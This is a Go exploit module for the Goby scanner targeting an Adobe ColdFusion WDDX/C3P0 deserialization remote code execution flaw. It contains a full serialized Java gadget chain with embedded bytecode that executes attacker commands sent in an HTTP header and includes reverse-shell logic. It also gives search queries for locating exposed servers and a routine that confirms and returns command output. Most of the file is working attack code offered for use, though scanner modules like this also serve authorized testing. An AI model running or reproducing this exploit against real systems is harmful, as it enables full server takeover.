package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Adobe ColdFusion WDDX C3P0 remote code execution vulnerability",
    "Description": "<p>Adobe Coldfusion is a commercial application server developed by Adobe for web applications.</p><p>The attacker can send unbelievable serialized data and trigger derivativeization to the Coldfusion server, thereby executing any code.</p>",
    "Product": "Adobe-ColdFusion",
    "Homepage": "https://www.adobe.com/",
    "DisclosureDate": "2023-07-13",
    "Author": "m0x0is3ry@foxmail.com",
    "FofaQuery": "body=\"/cfajax/\" || header=\"CFTOKEN\" || banner=\"CFTOKEN\" || body=\"ColdFusion.Ajax\" || body=\"<cfscript>\" || server=\"ColdFusion\" || title=\"ColdFusion\" || (body=\"crossdomain.xml\" && body=\"CFIDE\") || (body=\"#000808\" && body=\"#e7e7e7\")",
    "GobyQuery": "body=\"/cfajax/\" || header=\"CFTOKEN\" || banner=\"CFTOKEN\" || body=\"ColdFusion.Ajax\" || body=\"<cfscript>\" || server=\"ColdFusion\" || title=\"ColdFusion\" || (body=\"crossdomain.xml\" && body=\"CFIDE\") || (body=\"#000808\" && body=\"#e7e7e7\")",
    "Level": "3",
    "Impact": "<p>The attacker can execute the code at the server through this vulnerability, obtain the server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://helpx.adobe.com/security.html\">https://helpx.adobe.com/security.html</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Adobe ColdFusion WDDX C3P0 远程代码执行漏洞",
            "Product": "Adobe-ColdFusion",
            "Description": "<p>Adobe ColdFusion 是 Adobe 公司开发的用于 Web 应用程序开发的商业应用程序服务器。</p><p>攻击者可向 ColdFusion 服务器发送不受信任的序列化数据并触发反序列化，从而执行任意代码。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://helpx.adobe.com/security.html\">https://helpx.adobe.com/security.html</a></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Adobe ColdFusion WDDX C3P0 remote code execution vulnerability",
            "Product": "Adobe-ColdFusion",
            "Description": "<p>Adobe Coldfusion is a commercial application server developed by Adobe for web applications.</p><p>The attacker can send unbelievable serialized data and trigger derivativeization to the Coldfusion server, thereby executing any code.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:&nbsp;<a href=\"https://helpx.adobe.com/security.html\">https://helpx.adobe.com/security.html</a></p>",
            "Impact": "<p>The attacker can execute the code at the server through this vulnerability, obtain the server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-07-31",
    "PocId": "7443"
}`

	sendPayloadFlag3BZV := func(hostInfo *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		payload := `<wddxPacket version='1.0'><struct type='xcom.mchange.v2.c3p0.WrapperConnectionPoolDataSourcex'><var name='userOverridesAsString'><string>HexAsciiSerializedMapxACED0005737200176A6176612E7574696C2E5072696F72697479517565756594DA30B4FB3F82B103000249000473697A654C000A636F6D70617261746F727400164C6A6176612F7574696C2F436F6D70617261746F723B7870000000027372002B6F72672E6170616368652E636F6D6D6F6E732E6265616E7574696C732E4265616E436F6D70617261746F72E3A188EA7322A4480200024C000A636F6D70617261746F7271007E00014C000870726F70657274797400124C6A6176612F6C616E672F537472696E673B78707372003F6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E636F6D70617261746F72732E436F6D70617261626C65436F6D70617261746F72FBF49925B86EB13702000078707400106F757470757450726F706572746965737704000000037372003A636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C09574FC16EACAB3303000649000D5F696E64656E744E756D62657249000E5F7472616E736C6574496E6465785B000A5F62797465636F6465737400035B5B425B00065F636C6173737400125B4C6A6176612F6C616E672F436C6173733B4C00055F6E616D6571007E00044C00115F6F757470757450726F706572746965737400164C6A6176612F7574696C2F50726F706572746965733B787000000000FFFFFFFF757200035B5B424BFD19156767DB37020000787000000001757200025B42ACF317F8060854E0020000787000001D95CAFEBABE0000003401A20A001D00D30A00D400D50A00D400D60A001D00D708009A0A001B00D80A00D900DA0A00D900DB07009B0A00D400DC0800B20A002000DD0800DE0800DF0700E00800E10800E20700E30A001B00E40800E508008F0700E60B001600E70B001600E80800850800E90700EA0A001B00EB0700EC0A00ED00EE0800EF0700F00800870A007700F10A002000F20800F309002600F40700F50A002600F60800F70A007700F80A001B00F90800FA07008A0A001B00FB0800FC0700FD0800FE0800FF0A001B01000701010A00D401020A010300F80801040A002001050801060A002001070801080A002001090A0020010A08010B0A0020010C08010D0A0026010E0A0077010F0801100A007701110801120A011301140A002001150801160801170801180701190A004A00D30A004A011A08011B0A004A011C08011D08011E08011F0801200A012101220A012101230701240A012501260A005501270801280A005501290A0055012A0A0055012B0A0125012C0A0125012D0A002F011C08012E0A0020012F0801300A012101310701320A002601330A006301340A006301260A012501350A006301350A006301360A013701380A013701390A013A013B0A013A013C0500000000000000320A00D4013D0A0125013E0A0063013F0801400A002F01410801420801430701440100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C65010001650100204C6A6176612F6C616E672F4E6F537563684669656C64457863657074696F6E3B010003636C730100114C6A6176612F6C616E672F436C6173733B010004766172350100154C6A6176612F6C616E672F457863657074696F6E3B01000970726F636573736F720100124C6A6176612F6C616E672F4F626A6563743B01000372657101000472657370010003636D640100124C6A6176612F6C616E672F537472696E673B010006726573756C740100025B420100016A0100014901000A7468726561644E616D650100036F626A01000A70726F636573736F72730100104C6A6176612F7574696C2F4C6973743B0100067468726561640100124C6A6176612F6C616E672F5468726561643B01000169010004746869730100044C41343B01000567726F75700100174C6A6176612F6C616E672F54687265616447726F75703B010001660100194C6A6176612F6C616E672F7265666C6563742F4669656C643B010007746872656164730100135B4C6A6176612F6C616E672F5468726561643B01000D537461636B4D61705461626C650701440701450701460701470700F00700EC0700E30700E60700FD01000A457863657074696F6E730100096C6F6164436C617373010025284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F436C6173733B0100224C6A6176612F6C616E672F436C6173734E6F74466F756E64457863657074696F6E3B0100046E616D6507010101000765786563757465010026284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F537472696E673B010008686F7374496E666F0100135B4C6A6176612F6C616E672F537472696E673B010005706172616D0700AF01000465786563010001730100134C6A6176612F7574696C2F5363616E6E65723B0100066F75747075740100026F7301000770726F636573730100134C6A6176612F6C616E672F50726F636573733B01000A65786563757465436D6407014807012407011907014901000772657665727365010039284C6A6176612F6C616E672F537472696E673B4C6A6176612F6C616E672F496E74656765723B294C6A6176612F6C616E672F537472696E673B0100097368656C6C50617468010001700100114C6A6176612F6E65742F536F636B65743B01000270690100154C6A6176612F696F2F496E70757453747265616D3B01000270650100027369010002706F0100164C6A6176612F696F2F4F757470757453747265616D3B010002736F0100026970010004706F72740100134C6A6176612F6C616E672F496E74656765723B0700F507013207014A07014B01000A536F7572636546696C6501000741342E6A6176610C007800790701470C014C014D0C014E014F0C015001510C015201530701460C015401550C015601570C015801590C015A015B010004687474700100067461726765740100126A6176612F6C616E672F52756E6E61626C6501000674686973243001000768616E646C657201001E6A6176612F6C616E672F4E6F537563684669656C64457863657074696F6E0C015C0151010006676C6F62616C01000E6A6176612F7574696C2F4C6973740C015D015E0C0156015F01000B676574526573706F6E736501000F6A6176612F6C616E672F436C6173730C016001610100106A6176612F6C616E672F4F626A6563740701620C016301640100096765744865616465720100106A6176612F6C616E672F537472696E670C00AC00AD0C016501660100097365745374617475730C016700800100116A6176612F6C616E672F496E74656765720C007801680100246F72672E6170616368652E746F6D6361742E7574696C2E6275662E427974654368756E6B0C00A700A80C0169016A01000873657442797465730C016B0161010007646F57726974650100136A6176612F6C616E672F457863657074696F6E0100136A6176612E6E696F2E42797465427566666572010004777261700C016C00A80100206A6176612F6C616E672F436C6173734E6F74466F756E64457863657074696F6E0C016D016E07016F0100000C01700171010010636F6D6D616E64206E6F74206E756C6C0C0172015901000523232323230C017301740C017501760100013A0C01770178010022636F6D6D616E64207265766572736520686F737420666F726D6174206572726F72210C0179017A0C00BE00BF01000540404040400C00B200AD0100076F732E6E616D6507017B0C017C00AD0C017D015901000377696E01000470696E670100022D6E0100176A6176612F6C616E672F537472696E674275696C6465720C017E017F010005202D6E20340C018001590100022F63010005202D74203401000273680100022D630701810C018201830C00B201840100116A6176612F7574696C2F5363616E6E65720701480C018501860C007801870100025C610C018801890C018A018B0C018C01590C018D01860C018E00790100072F62696E2F73680C0078018F010007636D642E6578650C00B2019001000F6A6176612F6E65742F536F636B65740C0191015E0C007801920C019301940C0195018B07014A0C0196015E0C0197015E07014B0C019801680C019900790C019A019B0C019C015E0C019D007901001D726576657273652065786563757465206572726F722C206D7367202D3E0C019E015901000121010013726576657273652065786563757465206F6B2101000241340100156A6176612F6C616E672F54687265616447726F75700100176A6176612F6C616E672F7265666C6563742F4669656C640100106A6176612F6C616E672F5468726561640100116A6176612F6C616E672F50726F636573730100136A6176612F6C616E672F5468726F7761626C650100136A6176612F696F2F496E70757453747265616D0100146A6176612F696F2F4F757470757453747265616D01000D63757272656E7454687265616401001428294C6A6176612F6C616E672F5468726561643B01000E67657454687265616447726F757001001928294C6A6176612F6C616E672F54687265616447726F75703B010008676574436C61737301001328294C6A6176612F6C616E672F436C6173733B0100106765744465636C617265644669656C6401002D284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F7265666C6563742F4669656C643B01000D73657441636365737369626C65010004285A2956010003676574010026284C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0100076765744E616D6501001428294C6A6176612F6C616E672F537472696E673B010008636F6E7461696E7301001B284C6A6176612F6C616E672F4368617253657175656E63653B295A01000D6765745375706572636C61737301000473697A650100032829490100152849294C6A6176612F6C616E672F4F626A6563743B0100096765744D6574686F64010040284C6A6176612F6C616E672F537472696E673B5B4C6A6176612F6C616E672F436C6173733B294C6A6176612F6C616E672F7265666C6563742F4D6574686F643B0100186A6176612F6C616E672F7265666C6563742F4D6574686F64010006696E766F6B65010039284C6A6176612F6C616E672F4F626A6563743B5B4C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B010008676574427974657301000428295B42010004545950450100042849295601000B6E6577496E7374616E636501001428294C6A6176612F6C616E672F4F626A6563743B0100116765744465636C617265644D6574686F64010007666F724E616D65010015676574436F6E74657874436C6173734C6F6164657201001928294C6A6176612F6C616E672F436C6173734C6F616465723B0100156A6176612F6C616E672F436C6173734C6F61646572010006657175616C73010015284C6A6176612F6C616E672F4F626A6563743B295A0100047472696D01000A73746172747357697468010015284C6A6176612F6C616E672F537472696E673B295A0100077265706C616365010044284C6A6176612F6C616E672F4368617253657175656E63653B4C6A6176612F6C616E672F4368617253657175656E63653B294C6A6176612F6C616E672F537472696E673B01000573706C6974010027284C6A6176612F6C616E672F537472696E673B295B4C6A6176612F6C616E672F537472696E673B01000776616C75654F66010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F496E74656765723B0100106A6176612F6C616E672F53797374656D01000B67657450726F706572747901000B746F4C6F77657243617365010006617070656E6401002D284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F537472696E674275696C6465723B010008746F537472696E670100116A6176612F6C616E672F52756E74696D6501000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B010028285B4C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B01000E676574496E70757453747265616D01001728294C6A6176612F696F2F496E70757453747265616D3B010018284C6A6176612F696F2F496E70757453747265616D3B295601000C75736544656C696D69746572010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F7574696C2F5363616E6E65723B0100076861734E65787401000328295A0100046E65787401000E6765744572726F7253747265616D01000764657374726F79010015284C6A6176612F6C616E672F537472696E673B2956010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B010008696E7456616C7565010016284C6A6176612F6C616E672F537472696E673B49295601000F6765744F757470757453747265616D01001828294C6A6176612F696F2F4F757470757453747265616D3B0100086973436C6F736564010009617661696C61626C65010004726561640100057772697465010005666C757368010005736C656570010004284A29560100096578697456616C7565010005636C6F736501000A6765744D657373616765010040636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F72756E74696D652F41627374726163745472616E736C657407019F0A01A000D30021007701A00000000000050001007800790002007A0000059700080011000002982AB701A1B80002B600034C2BB600041205B600064D2C04B600072C2BB60008C00009C000094E03360415042DBEA2026A2D1504323A051905C70006A702561905B6000A3A061906120BB6000C9A000D1906120DB6000C9A0006A702381905B60004120EB600064D2C04B600072C1905B600083A071907C1000F9A0006A702151907B600041210B600064D2C04B600072C1907B600083A071907B600041211B600064DA700163A081907B60004B60013B600131211B600064D2C04B600072C1907B600083A071907B60004B600131214B600064DA700103A081907B600041214B600064D2C04B600072C1907B600083A071907B600041215B600064D2C04B600072C1907B60008C00016C000163A0803360915091908B900170100A2016F19081509B9001802003A0A190AB600041219B600064D2C04B600072C190AB600083A0B190BB60004121A03BD001BB6001C190B03BD001DB6001E3A0C190BB60004121F04BD001B5903122053B6001C190B04BD001D5903122153B6001EC000203A0D190DC70006A700FF2A190DB60022B600233A0E190CB60004122404BD001B5903B2002553B6001C190C04BD001D5903BB0026591100C8B7002753B6001E572A1228B600293A0F190FB6002A3A07190F122B06BD001B5903122C535904B20025535905B2002553B6002D190706BD001D5903190E535904BB00265903B70027535905BB002659190EBEB7002753B6001E57190CB60004122E04BD001B5903190F53B6001C190C04BD001D5903190753B6001E57A7004F3A0F2A1230B600293A101910123104BD001B5903122C53B6002D191004BD001D5903190E53B6001E3A07190CB60004122E04BD001B5903191053B6001C190C04BD001D5903190753B6001E57A70017840901A7FE8BA700083A06A70003840401A7FD95B10008009700A200A5001200C500D300D6001201BD02310234002F0036003B028C002F003E0059028C002F005C007C028C002F007F0280028C002F02830289028C002F0003007B000000EE003B0000000D0004000E000B000F00150010001A0011002600130030001400360016003E001700450018005C00190067001A006C001B0074001C007F001D008A001E008F001F0097002100A2002400A5002200A7002300B8002500BD002600C5002800D3002B00D6002900D8002A00E3002C00E8002D00F0002E00FB002F01000030010E0031011D00320128003301330034013800350140003601590037017F0038018400390187003B0192003C01BD003E01C5003F01CC0040020F0041023100460234004202360043023E0044025E004502800047028300310289004B028C0049028E004A029100130297004D007C000000D4001500A70011007D007E000800D8000B007D007E000801C5006C007F0080000F023E0042007F008000100236004A00810082000F0128015B00830084000A0140014300850084000B0159012A00860084000C017F010400870088000D019200F10089008A000E01110178008B008C000900450244008D0088000600740215008E00840007010E017B008F00900008028E0003007D008200060036025B0091009200050029026E0093008C000400000298009400950000000B028D0096009700010015028300980099000200260272009A009B0003009C000000DF0012FF0029000507009D07009E07009F070009010000FC00140700A0FC001A0700A102FC00220700A2650700A3125D0700A30CFD002D0700A401FF0075000E07009D07009E07009F070009010700A00700A10700A20700A4010700A20700A20700A20700A10000FF00AC000F07009D07009E07009F070009010700A00700A10700A20700A4010700A20700A20700A20700A107002C00010700A5FB004BFF0002000A07009D07009E07009F070009010700A00700A10700A20700A4010000FF0005000607009D07009E07009F070009010700A00000420700A5FA0004FA000500A6000000040001002F000100A700A80002007A0000006B00020003000000112BB80032B04DB80002B600342BB60035B0000100000004000500330003007B0000000E000300000058000500590006005A007C0000002000030006000B007D00A90002000000110094009500000000001100AA00880001009C000000060001450700AB00A60000000400010033000100AC00AD0001007A000000C800040003000000572BC6000C12362BB600379900061238B02BB600394C2B123AB6003B9900282B123A1236B6003C123DB6003E4D2CBE059F0006123FB02A2C03322C0432B80040B60041B02A2B123A1236B6003C12421236B6003CB60043B000000003007B00000026000900000065000D00660010006800150069001E006B002C006C0032006D0035006F00430071007C000000200003002C001700AE00AF0002000000570094009500000000005700B000880001009C0000000D00040D02FC00240700B1FA000D000100B200AD0001007A000002D9000400090000012A1244B80045B600464D2BB600394C014E013A042C1247B6000C9900402B1248B6000C9900202B1249B6000C9A0017BB004A59B7004B2BB6004C124DB6004CB6004E4C06BD002059031221535904124F5359052B533A04A7003D2B1248B6000C9900202B1249B6000C9A0017BB004A59B7004B2BB6004C1250B6004CB6004E4C06BD00205903125153590412525359052B533A04B800531904B600544EBB0055592DB60056B700571258B600593A051905B6005A99000B1905B6005BA7000512363A06BB0055592DB6005CB700571258B600593A05BB004A59B7004B1906B6004C1905B6005A99000B1905B6005BA700051236B6004CB6004E3A0619063A072DC600072DB6005D1907B03A051905B6005E3A062DC600072DB6005D1906B03A082DC600072DB6005D1908BF0004009300FE0109002F009300FE011D000001090112011D0000011D011F011D00000003007B0000006600190000007500090076000E00770010007800130079001C007A002E007B0042007D0059007F006B0080007F008200930085009C008600AE008700C2008800D4008900FA008A00FE008E0102008F0109008B010B008C0112008E0116008F011D008E0123008F007C00000052000800AE005B00B300B4000500C2004700B500880006010B0012007D008200050000012A0094009500000000012A0087008800010009012100B6008800020010011A00B700B800030013011700B900AF0004009C000000B9000DFE00420700A10700BA0700B1162513FC002A0700BB410700A1FF002F000707009D0700A10700A10700BA0700B10700BB0700A100010700BCFF0001000707009D0700A10700A10700BA0700B10700BB0700A100020700BC0700A1FC00130700A1FF0002000507009D0700A10700A10700BA0700B100010700A5FD00100700A50700A1FF0002000507009D0700A10700A10700BA0700B100010700BDFF0009000907009D0700A10700A10700BA0700B10000000700BD0000000100BE00BF0001007A000002610004000C000000F31244B80045B600461247B6000C9A0010BB002059125FB700604EA7000DBB0020591261B700604EB800532DB600623A04BB0063592B2CB60064B700653A051904B600563A061904B6005C3A071905B600663A081904B600673A091905B600683A0A1905B600699A00601906B6006A9E0010190A1906B6006BB6006CA7FFEE1907B6006A9E0010190A1907B6006BB6006CA7FFEE1908B6006A9E001019091908B6006BB6006CA7FFEE190AB6006D1909B6006D14006EB800701904B6007157A700083A0BA7FF9E1904B6005D1905B60072A700204EBB004A59B7004B1273B6004C2DB60074B6004C1275B6004CB6004EB01276B0000200B800BE00C1002F000000D000D3002F0003007B0000006E001B0000009E0010009F001D00A1002700A3003000A4003E00A5005300A6006100A7006900A8007100A9007E00AB008600AC009300AE009B00AF00A800B100AD00B200B200B300B800B500BE00B600C100B700C300B800C600BA00CB00BB00D000BE00D300BC00D400BD00F000BF007C00000084000D001A000300C000880003002700A900C000880003003000A000C100B80004003E009200B300C200050045008B00C300C40006004C008400C500C400070053007D00C600C40008005A007600C700C800090061006F00C900C8000A00D4001C007D00820003000000F3009400950000000000F300CA00880001000000F300CB00CC0002009C0000004E000B1DFC00090700A1FF0039000B07009D0700A10700CD0700A10700BA0700CE0700CF0700CF0700CF0700D00700D0000007141414580700A504FF000C000307009D0700A10700CD00010700A51C000100D10000000200D2707400087768617465766572707701007871007E001278x</string></var></struct></wddxPacket>`
		cfg := httpclient.NewPostRequestConfig("/CFIDE/adminapi/base.cfc?method")
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		if cmd != "" {
			cfg.Header.Store("cmd", cmd)
		}
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Data = "argumentCollection=" + url.QueryEscape(payload)
		return httpclient.DoHttpRequest(hostInfo, cfg)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(16)
			rsp, err := sendPayloadFlag3BZV(u, "echo "+checkStr)
			if err != nil {
				return false
			}
			return strings.Contains(rsp.Utf8Html, checkStr) && !strings.Contains(rsp.Utf8Html, "echo "+checkStr)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := goutils.B2S(ss.Params["cmd"])
			rsp, err := sendPayloadFlag3BZV(expResult.HostInfo, cmd)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
			} else {
				output := ""
				if strings.Contains(rsp.Utf8Html, "<!-- \" --->") {
					expResult.Success = true
					output = rsp.Utf8Html[:strings.Index(rsp.Utf8Html, "<!-- \" --->")]
				} else {
					expResult.Success = false
					output = "漏洞利用失败"
				}
				expResult.Output = output
			}
			return expResult
		},
	))
}
